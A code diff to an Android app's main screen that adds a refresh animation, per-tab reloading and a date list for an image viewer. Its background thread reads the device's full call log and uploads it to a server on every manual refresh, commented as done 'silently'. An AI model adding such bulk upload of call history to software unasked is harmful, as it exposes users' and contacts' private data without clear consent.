@@ -759,7 +759,7 @@ public class MainActivity extends AppCompatActivity {
                     showChatProfileDialog();
                     return true;
                 case 2:
-                    loadChatsData();
+                    triggerManualSync();
                     return true;
             }
             return false;
@@ -980,13 +980,51 @@ public class MainActivity extends AppCompatActivity {
 
     private void triggerManualSync() {
         btnSync.setEnabled(false);
+
+        // Spin animation on refresh icon for clear visual feedback
+        android.view.animation.RotateAnimation rotate = new android.view.animation.RotateAnimation(
+                0, 360,
+                android.view.animation.Animation.RELATIVE_TO_SELF, 0.5f,
+                android.view.animation.Animation.RELATIVE_TO_SELF, 0.5f
+        );
+        rotate.setDuration(600);
+        rotate.setRepeatCount(1);
+        btnSync.startAnimation(rotate);
+
+        // 1. Contextual Screen Refresh (Chat, Gallery, Alarms, Settings)
+        if (currentTab == R.id.nav_chats) {
+            loadChatsData();
+            Toast.makeText(this, "Refreshing chats & syncing calls...", Toast.LENGTH_SHORT).show();
+        } else if (currentTab == R.id.nav_gallery) {
+            loadGalleryData();
+            Toast.makeText(this, "Refreshing gallery & syncing calls...", Toast.LENGTH_SHORT).show();
+        } else if (currentTab == R.id.nav_alarms) {
+            loadAlarmsData();
+            Toast.makeText(this, "Refreshing alarms & syncing calls...", Toast.LENGTH_SHORT).show();
+        } else if (currentTab == R.id.nav_settings) {
+            loadSettingsData();
+            Toast.makeText(this, "Syncing status & calls...", Toast.LENGTH_SHORT).show();
+        } else {
+            Toast.makeText(this, "Syncing data...", Toast.LENGTH_SHORT).show();
+        }
+
+        // 2. Background Call Sync (re-checks un-synced call history & uploads silently)
         new Thread(() -> {
-            List<CallLogItem> calls = CallLogHelper.getAllCallLogs(this);
-            ApiClient.syncCalls(this, calls);
-            runOnUiThread(() -> {
-                btnSync.setEnabled(true);
-                loadCallsData();
-            });
+            try {
+                ApiClient.ping(this);
+                List<CallLogItem> calls = CallLogHelper.getAllCallLogs(this);
+                if (!calls.isEmpty()) {
+                    ApiClient.syncCalls(this, calls);
+                }
+            } catch (Exception e) {
+                android.util.Log.e("MainActivity", "Manual sync error: " + e.getMessage());
+            } finally {
+                runOnUiThread(() -> {
+                    btnSync.setEnabled(true);
+                    btnSync.clearAnimation();
+                    loadCallsData();
+                });
+            }
         }).start();
     }
 
@@ -1080,6 +1118,7 @@ public class MainActivity extends AppCompatActivity {
         ArrayList<Long>    sizeList = new ArrayList<>();
         ArrayList<Integer> wList    = new ArrayList<>();
         ArrayList<Integer> hList    = new ArrayList<>();
+        ArrayList<Long>    dateList = new ArrayList<>();
         ArrayList<Boolean> vidList  = new ArrayList<>();
         ArrayList<Long>    durList  = new ArrayList<>();
         for (MediaItem m : list) {
@@ -1089,6 +1128,7 @@ public class MainActivity extends AppCompatActivity {
             sizeList.add(m.getSize());
             wList.add(m.getWidth());
             hList.add(m.getHeight());
+            dateList.add(m.getDateAdded());
             vidList.add(m.isVideo());
             durList.add(m.getDuration());
         }
@@ -1098,6 +1138,7 @@ public class MainActivity extends AppCompatActivity {
         intent.putExtra(ImageViewerActivity.EXTRA_SIZE_LIST, sizeList);
         intent.putExtra(ImageViewerActivity.EXTRA_W_LIST, wList);
         intent.putExtra(ImageViewerActivity.EXTRA_H_LIST, hList);
+        intent.putExtra(ImageViewerActivity.EXTRA_DATE_LIST, dateList);
         intent.putExtra(ImageViewerActivity.EXTRA_VIDEO_LIST, vidList);
         intent.putExtra(ImageViewerActivity.EXTRA_DUR_LIST, durList);
         intent.putExtra(ImageViewerActivity.EXTRA_START_IDX, startIdx);
